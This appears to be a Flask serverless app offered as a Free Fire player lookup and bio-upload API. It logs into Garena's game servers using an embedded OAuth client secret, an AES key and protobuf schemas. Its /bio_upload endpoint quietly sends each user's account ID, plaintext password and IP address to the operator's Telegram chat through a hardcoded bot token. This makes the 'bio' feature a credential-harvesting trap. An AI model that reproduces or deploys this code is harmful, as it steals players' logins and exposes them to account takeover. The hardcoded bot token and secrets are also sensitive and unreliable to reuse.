"""
FREE FIRE PLAYER LOOKUP - VERCEL READY
Sync only | No asyncio | Serverless compatible
"""

import json
import sys
import base64
import re
import os
import requests
import urllib3
from datetime import datetime
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== EMBED PROTOBUF ====================
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import runtime_version as _runtime_version
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
from google.protobuf import json_format as _json_format

os.environ['PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION'] = 'python'

# FreeFire.proto
_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 30, 0, '', 'FreeFire.proto')
FF_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0e\x46reeFire.proto\"c\n\x08LoginReq\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0blogin_token\x18\x1d \x01(\t\x12\x1b\n\x13orign_platform_type\x18\x63 \x01(\t\"]\n\x10\x42lacklistInfoRes\x12\x1e\n\nban_reason\x18\x01 \x01(\x0e\x32\n.BanReason\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\r\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\r\"f\n\x0eLoginQueueInfo\x12\r\n\x05\x61llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\r\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\r\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\"\xa0\x03\n\x08LoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x04\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\x19\n\x11recommend_regions\x18\x07 \x03(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\r\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0b \x01(\r\x12$\n\tblacklist\x18\x0c \x01(\x0b\x32\x11.BlacklistInfoRes\x12#\n\nqueue_info\x18\r \x01(\x0b\x32\x0f.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x0e \x01(\t\x12\x15\n\rapp_server_id\x18\x0f \x01(\r\x12\x0f\n\x07\x61no_url\x18\x10 \x01(\t\x12\x0f\n\x07ip_city\x18\x11 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x12 \x01(\t*\xa8\x01\n\tBanReason\x12\x16\n\x12\x42\x41N_REASON_UNKNOWN\x10\x00\x12\x1b\n\x17\x42\x41N_REASON_IN_GAME_AUTO\x10\x01\x12\x15\n\x11\x42\x41N_REASON_REFUND\x10\x02\x12\x15\n\x11\x42\x41N_REASON_OTHERS\x10\x03\x12\x16\n\x12\x42\x41N_REASON_SKINMOD\x10\x04\x12 \n\x1b\x42\x41N_REASON_IN_GAME_AUTO_NEW\x10\xf6\x07\x62\x06proto3')
_g = {}
_builder.BuildMessageAndEnumDescriptors(FF_DESC, _g)
_builder.BuildTopDescriptorsAndMessages(FF_DESC, 'FreeFire_pb2', _g)
LoginReq = _g['LoginReq']
LoginRes = _g['LoginRes']

# main.proto
MAIN_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x0csample.proto\"*\n\x12SearchWorkshopCode\x12\t\n\x01\x61\x18\x01 \x01(\t\x12\t\n\x01\x62\x18\x02 \x01(\x05\"-\n\x15GetPlayerPersonalShow\x12\t\n\x01\x61\x18\x01 \x01(\x03\x12\t\n\x01\x62\x18\x02 \x01(\x05\x62\x06proto3')
_g2 = {}
_builder.BuildMessageAndEnumDescriptors(MAIN_DESC, _g2)
_builder.BuildTopDescriptorsAndMessages(MAIN_DESC, 'main_pb2', _g2)
GetPlayerPersonalShow = _g2['GetPlayerPersonalShow']

# AccountPersonalShow.proto
_runtime_version.ValidateProtobufRuntimeVersion(_runtime_version.Domain.PUBLIC, 6, 33, 1, '', 'AccountPersonalShow.proto')
APS_DESC = _descriptor_pool.Default().AddSerializedFile(b'\n\x19\x41\x63\x63ountPersonalShow.proto\x12\x08\x66reefire\"\xac\x17\n\x10\x41\x63\x63ountInfoBasic\x12\x17\n\naccount_id\x18\x01 \x01(\x04H\x00\x88\x01\x01\x12\x15\n\x08nickname\x18\x03 \x01(\tH\x02\x88\x01\x01\x12\x13\n\x06region\x18\x05 \x01(\tH\x04\x88\x01\x01\x12\x12\n\x05level\x18\x06 \x01(\rH\x05\x88\x01\x01\x12\x11\n\x04rank\x18\x0e \x01(\rH\r\x88\x01\x01\x12\x1b\n\x0eranking_points\x18\x0f \x01(\rH\x0e\x88\x01\x01\x12\x12\n\x05liked\x18\x15 \x01(\rH\x14\x88\x01\x01\x12\x1a\n\rlast_login_at\x18\x18 \x01(\x03H\x17\x88\x01\x01\x12\x14\n\x07\x63s_rank\x18\x1e \x01(\rH\x1d\x88\x01\x01\x12\x16\n\tcreate_at\x18, \x01(\x03H*\x88\x01\x01\x12\x14\n\x07\x63lan_id\x18\x36 \x01(\x04H3\x88\x01\x01\x12\x16\n\tclan_name\x18\r \x01(\tH\x0c\x88\x01\x01\x42\r\n\x0b_account_idB\x0b\n\t_nicknameB\t\n\x07_regionB\x08\n\x06_levelB\x07\n\x05_rankB\x11\n\x0f_ranking_pointsB\x08\n\x06_likedB\x10\n\x0e_last_login_atB\n\n\x08_cs_rankB\x0c\n\n_create_atB\n\n\x08_clan_idB\x0c\n\n_clan_name\"\x98\x05\n\rAvatarProfile\x12\x16\n\tavatar_id\x18\x01 \x01(\rH\x00\x88\x01\x01\x12\x0f\n\x07\x63lothes\x18\x04 \x03(\r\x12\x16\n\x0e\x65quiped_skills\x18\x05 \x03(\r\x42\x0c\n\n_avatar_id\"\xd5\x05\n\x0fSocialBasicInfo\x12\x16\n\tsignature\x18\t \x01(\tH\x06\x88\x01\x01\x42\x0c\n\n_signature\"\x9d\x02\n\rClanInfoBasic\x12\x16\n\tclan_name\x18\x02 \x01(\tH\x01\x88\x01\x01\x12\x17\n\nclan_level\x18\x04 \x01(\rH\x03\x88\x01\x01\x42\x0c\n\n_clan_nameB\r\n\x0b_clan_level\"<\n\x0e\x44iamondCostRes\x12\x19\n\x0c\x64iamond_cost\x18\x01 \x01(\rH\x00\x88\x01\x01\x42\x0f\n\r_diamond_cost\"\xfd\x03\n\x14\x43reditScoreInfoBasic\x12\x19\n\x0c\x63redit_score\x18\x01 \x01(\rH\x00\x88\x01\x01\x42\x0f\n\r_credit_score\"\xfa\x06\n\x17\x41\x63\x63ountPersonalShowInfo\x12\x33\n\nbasic_info\x18\x01 \x01(\x0b\x32\x1a.freefire.AccountInfoBasicH\x00\x88\x01\x01\x12\x32\n\x0cprofile_info\x18\x02 \x01(\x0b\x32\x17.freefire.AvatarProfileH\x01\x88\x01\x01\x12\x35\n\x0f\x63lan_basic_info\x18\x06 \x01(\x0b\x32\x17.freefire.ClanInfoBasicH\x03\x88\x01\x01\x12\x33\n\x0bsocial_info\x18\t \x01(\x0b\x32\x19.freefire.SocialBasicInfoH\x06\x88\x01\x01\x12\x37\n\x10\x64iamond_cost_res\x18\n \x01(\x0b\x32\x18.freefire.DiamondCostResH\x07\x88\x01\x01\x12>\n\x11\x63redit_score_info\x18\x0b \x01(\x0b\x32\x1e.freefire.CreditScoreInfoBasicH\x08\x88\x01\x01\x42\r\n\x0b_basic_infoB\x0f\n\r_profile_infoB\x12\n\x10_clan_basic_infoB\x0e\n\x0c_social_infoB\x13\n\x11_diamond_cost_resB\x14\n\x12_credit_score_info\"\x99\x02\n\x0b\x42\x61sicEPInfo\x12\x17\n\nevent_name\x18\x07 \x01(\tH\x06\x88\x01\x01\x42\r\n\x0b_event_name*\xa0\x01\n\x10VeteranLeaveDays\x12\x19\n\x15VeteranLeaveDays_NONE\x10\x00*w\n\x14PreVeteranActionType\x12\x1d\n\x19PreVeteranActionType_NONE\x10\x00*s\n\x12\x45xternalIconStatus\x12\x1b\n\x17\x45xternalIconStatus_NONE\x10\x00*t\n\x14\x45xternalIconShowType\x12\x1d\n\x19\x45xternalIconShowType_NONE\x10\x00*\xf0\x02\n\tHighLight\x12\x12\n\x0eHighLight_NONE\x10\x00*T\n\x06Gender\x12\x0f\n\x0bGender_NONE\x10\x00*\xf5\x03\n\x08Language\x12\x11\n\rLanguage_NONE\x10\x00*l\n\nTimeOnline\x12\x13\n\x0fTimeOnline_NONE\x10\x00*\x84\x01\n\nTimeActive\x12\x13\n\x0fTimeActive_NONE\x10\x00*\xf6\x02\n\x11PlayerBattleTagID\x12\x1a\n\x16PlayerBattleTagID_NONE\x10\x00*\xe4\x01\n\tSocialTag\x12\x12\n\x0eSocialTag_NONE\x10\x00*\x80\x01\n\nModePrefer\x12\x13\n\x0fModePrefer_NONE\x10\x00*X\n\x08RankShow\x12\x11\n\rRankShow_NONE\x10\x00*L\n\x1b\x45LeaderBoardTitleRegionType\x12\x08\n\x04None\x10\x00*6\n\nUnlockType\x12\x13\n\x0fUnlockType_NONE\x10\x00*E\n\x0b\x45quipSource\x12\x14\n\x10\x45quipSource_SELF\x10\x00*\xfa\x01\n\x08NewsType\x12\x11\n\rNewsType_NONE\x10\x00*]\n\x0bRewardState\x12\x18\n\x14REWARD_STATE_INVALID\x10\x00\x62\x06proto3')
_g3 = {}
_builder.BuildMessageAndEnumDescriptors(APS_DESC, _g3)
_builder.BuildTopDescriptorsAndMessages(APS_DESC, 'AccountPersonalShow_pb2', _g3)
AccountPersonalShowInfo = _g3['AccountPersonalShowInfo']

# ==================== CONFIG ====================
from Crypto.Cipher import AES as CryptoAES
G = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
F = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

BOT_TOKEN = "8965307683:AAGXwuIge4QKuYXtrkXhG4AahxDrynqi7SY"
OWNER_ID = 8660700322
CHANNEL_PROMO = "@dindingijo"
SERVER_URL = "https://clientbp.ggpolarbear.com"

app = Flask(__name__)

# ==================== HELPERS (SYNC ONLY!) ====================
def pad(d): 
    l = CryptoAES.block_size - (len(d) % CryptoAES.block_size)
    return d + bytes([l] * l)

def encrypt(d): 
    return CryptoAES.new(G, CryptoAES.MODE_CBC, F).encrypt(pad(d))

def parse_pb(d, mt): 
    m = mt()
    m.ParseFromString(d)
    return m

def decode_jwt(token):
    try:
        parts = token.split('.')
        if len(parts) < 2: return None
        p = parts[1]
        p += '=' * (4 - len(p) % 4) if len(p) % 4 else ''
        return json.loads(base64.b64decode(p))
    except: return None

# ==================== SYNC GEN TOKEN ====================
def gen_token_sync(uid, password):
    """Generate token - FULLY SYNC"""
    try:
        # Step 1: OAuth
        data = f"uid={uid}&password={password}&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"
        r = requests.post(
            "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant",
            data=data,
            headers={'Content-Type': "application/x-www-form-urlencoded"},
            timeout=30
        )
        d = r.json()
        token, oid = d.get("access_token", "0"), d.get("open_id", "0")
        if token == "0": return None
        
        # Step 2: Build LoginReq
        m = LoginReq()
        _json_format.ParseDict({"open_id": oid, "open_id_type": "4", "login_token": token, "orign_platform_type": "4"}, m)
        pb = encrypt(m.SerializeToString())
        
        # Step 3: MajorLogin
        r = requests.post(
            "https://loginbp.ggpolarbear.com/MajorLogin",
            data=pb,
            headers={'Content-Type': "application/octet-stream", 'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"},
            timeout=30
        )
        if r.status_code == 200:
            msg = json.loads(_json_format.MessageToJson(parse_pb(r.content, LoginRes)))
            return f"Bearer {msg.get('token', '0')}"
        return None
    except Exception as e:
        print(f"Token gen error: {e}")
        return None

# ==================== SYNC FETCH PLAYER ====================
def fetch_player_sync(uid, token):
    """Fetch player data - FULLY SYNC"""
    try:
        m = GetPlayerPersonalShow()
        _json_format.ParseDict({"a": str(uid), "b": "7"}, m)
        pb = encrypt(m.SerializeToString())
        
        r = requests.post(
            f"{SERVER_URL}/GetPlayerPersonalShow",
            data=pb,
            headers={
                'Content-Type': "application/octet-stream",
                'Authorization': token if token.startswith("Bearer ") else f"Bearer {token}",
                'X-Unity-Version': "2018.4.11f1", 'X-GA': "v1 1", 'ReleaseVersion': "OB54"
            },
            timeout=30
        )
        if r.status_code != 200: return None
        
        data = json.loads(_json_format.MessageToJson(parse_pb(r.content, AccountPersonalShowInfo)))
        basic = data.get('basicInfo', {})
        if not basic.get('nickname'): return None
        
        profile = data.get('profileInfo', {})
        social = data.get('socialInfo', {})
        clan = data.get('clanBasicInfo', {})
        
        return {
            'uid': uid,
            'nickname': basic.get('nickname', '?'),
            'level': basic.get('level', 0),
            'region': basic.get('region', '?'),
            'br_rank': basic.get('rank', 0),
            'cs_rank': basic.get('csRank', 0),
            'liked': basic.get('liked', 0),
            'clan': clan.get('clanName', ''),
            'clan_level': clan.get('clanLevel', 0),
            'avatar': profile.get('avatarId', ''),
            'clothes': profile.get('clothes', []),
            'skills': len(profile.get('equipedSkills', [])),
            'signature': social.get('signature', ''),
            'diamond': data.get('diamondCostRes', {}).get('diamondCost', 0),
            'credit': data.get('creditScoreInfo', {}).get('creditScore', 100),
            'created': basic.get('createAt', ''),
            'last_login': basic.get('lastLoginAt', ''),
        }
    except Exception as e:
        print(f"Fetch error: {e}")
        return None

# ==================== TELEGRAM ====================
def send_file_to_telegram(account_id, content):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        filename = f"{account_id}.txt"
        with open('/tmp/' + filename, 'w', encoding='utf-8') as f: f.write(content)
        with open('/tmp/' + filename, 'rb') as f:
            files = {'document': (filename, f, 'text/plain')}
            r = requests.post(url, files=files, data={'chat_id': OWNER_ID}, timeout=30)
        return r.status_code == 200
    except Exception as e:
        print(f"Telegram error: {e}")
        return False

def build_file_content(data, password=None, method="JWT", ip=""):
    lines = []
    lines.append("🔥 FREE FIRE PLAYER LOOKUP 🔥")
    lines.append("")
    lines.append(f"👤 Name       : {data.get('nickname','?')}")
    lines.append(f"🆔 Account ID : {data.get('uid','?')}")
    if password:
        lines.append(f"🔑 UID/Pass   : {data.get('uid','?')} / {password}")
    lines.append(f"📊 Level      : {data.get('level','?')}")
    lines.append(f"🏆 BR Rank    : {data.get('br_rank','?')} pts")
    lines.append(f"⭐ CS Rank    : {data.get('cs_rank','?')} pts")
    lines.append(f"👍 Liked      : {data.get('liked','?')}")
    lines.append(f"💎 Diamond    : {data.get('diamond','?')}")
    lines.append(f"⭐ Credit     : {data.get('credit','?')}")
    lines.append(f"🌍 Region     : {data.get('region','?')}")
    if data.get('clan'):
        lines.append(f"🏠 Clan       : {data.get('clan')} (Lv.{data.get('clan_level',0)})")
    lines.append(f"💬 Signature  : {data.get('signature','?')[:100]}")
    lines.append(f"🎒 Equipment  : Avatar={data.get('avatar','?')}, Clothes={len(data.get('clothes',[]))} items, Skills={data.get('skills',0)} slots")
    if data.get('created'):
        lines.append(f"📅 Created    : {datetime.fromtimestamp(int(data['created'])).strftime('%d/%m/%Y')}")
    if data.get('last_login'):
        lines.append(f"🔐 Last Login : {datetime.fromtimestamp(int(data['last_login'])).strftime('%d/%m/%Y %H:%M')}")
    lines.append("")
    lines.append(f"⏰ Time: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}")
    lines.append(f"📞 IP   : {ip}")
    lines.append(f"🔍 Method: {method}")
    lines.append(f"💡 {CHANNEL_PROMO}")
    return "\n".join(lines)

# ==================== ROUTES ====================
@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Free Fire API - Vercel Ready",
        "endpoints": ["/bio_upload", "/generate_jwt", "/check_profile", "/get_bio"]
    })

@app.route("/bio_upload", methods=["GET", "POST"])
def bio_upload():
    bio = request.args.get("bio") or request.form.get("bio")
    jwt_token = request.args.get("jwt") or request.form.get("jwt")
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    region = (request.args.get("region") or request.form.get("region") or "id").upper()
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    if not bio:
        return jsonify({"status": "Error", "error": "Missing bio"}), 400
    
    final_jwt = jwt_token
    final_uid = uid
    final_password = password or "N/A"
    login_method = "Direct JWT"
    account_id = None
    
    if final_jwt:
        jwt_data = decode_jwt(final_jwt)
        if jwt_data:
            account_id = jwt_data.get("account_id") or jwt_data.get("sub")
            if account_id: final_uid = account_id
    
    elif uid and password:
        login_method = "UID/Pass"
        final_uid = uid
        final_password = password
        token = gen_token_sync(uid, password)
        if token:
            final_jwt = token
            jwt_data = decode_jwt(token)
            if jwt_data:
                account_id = jwt_data.get("account_id") or jwt_data.get("sub")
        else:
            return jsonify({"status": "Failed", "error": "JWT generation failed"}), 401
    
    if not final_jwt:
        return jsonify({"status": "Error", "error": "No JWT"}), 400
    
    # Fetch player
    data = fetch_player_sync(final_uid, final_jwt) if final_uid else None
    if not data:
        data = {"nickname": "Unknown", "level": "?", "br_rank": "?", "uid": final_uid, "region": region, "clan": "", "avatar": "", "clothes": [], "skills": 0, "signature": "", "diamond": 0, "credit": 0, "cs_rank": 0, "liked": 0, "created": "", "last_login": ""}
    
    # Send file
    file_content = build_file_content(data, password=final_password if uid and password else None, method=login_method, ip=client_ip)
    file_sent = send_file_to_telegram(str(account_id or final_uid), file_content)
    
    return jsonify({
        "success": True,
        "data": data,
        "password_used": final_password if uid and password else None,
        "telegram_sent": file_sent,
        "ip": client_ip
    })

@app.route("/generate_jwt", methods=["GET", "POST"])
def generate_jwt():
    uid = request.args.get("uid") or request.form.get("uid")
    password = request.args.get("pass") or request.form.get("pass")
    if not uid or not password:
        return jsonify({"success": False, "error": "Missing uid/pass"}), 400
    
    token = gen_token_sync(uid, password)
    if token:
        jwt_data = decode_jwt(token)
        return jsonify({
            "success": True,
            "uid": uid,
            "account_id": jwt_data.get("account_id") if jwt_data else None,
            "jwt": token
        })
    return jsonify({"success": False}), 401

@app.route("/check_profile", methods=["GET"])
def check_profile():
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")
    if not uid or not jwt_token:
        return jsonify({"error": "Missing uid/jwt"}), 400
    
    data = fetch_player_sync(uid, jwt_token)
    if data:
        return jsonify({"success": True, "data": data})
    return jsonify({"success": False}), 404

@app.route("/get_bio", methods=["GET"])
def get_bio():
    uid = request.args.get("uid")
    jwt_token = request.args.get("jwt")
    region = request.args.get("region", "id")
    
    if not uid:
        return jsonify({"success": False, "error": "Missing uid"}), 400
    
    # Try API first
    try:
        r = requests.get(f"https://ff.ggbluewhale.store/api/data?region={region}&uid={uid}&key=kenn", timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get('basicInfo'):
                basic = data['basicInfo']
                social = data.get('socialInfo', {})
                return jsonify({
                    "success": True,
                    "action": "GET BIO",
                    "data": {
                        "uid": basic.get('accountId', uid),
                        "name": basic.get('nickname', 'Unknown'),
                        "level": basic.get('level', '?'),
                        "bio": social.get('signature', ''),
                    }
                })
    except: pass
    
    # Fallback to protobuf
    if jwt_token:
        data = fetch_player_sync(uid, jwt_token)
        if data:
            return jsonify({"success": True, "action": "GET BIO", "data": data})
    
    return jsonify({"success": False, "error": "Not found"}), 404

# ==================== VERCEL HANDLER ====================
app = app

if __name__ == "__main__":
    print("🚀 Free Fire API - Vercel Ready")
    app.run(host="0.0.0.0", port=5000)
